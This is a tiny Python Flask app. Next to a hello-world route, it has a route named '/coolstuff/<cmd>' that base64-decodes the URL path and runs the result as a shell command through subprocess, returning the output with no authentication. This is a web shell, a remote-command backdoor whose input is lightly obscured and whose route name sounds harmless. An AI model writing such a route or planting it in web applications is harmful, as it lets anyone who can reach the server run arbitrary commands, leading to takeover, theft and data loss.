from flask import Flask
import subprocess
app = Flask(__name__)

@app.route("/")
def hello_world():
    return "wadup?"

@app.route("/coolstuff/<cmd>")
def coolting(cmd):
    ccmd = cmd.decode('base64').split(' ')
    #return str(ccmd)
    if len(ccmd) == 1:
        return subprocess.Popen(ccmd[0], stdout=-1).communicate()[0]
    else:
        return subprocess.Popen(ccmd, stdout=-1).communicate()[0]
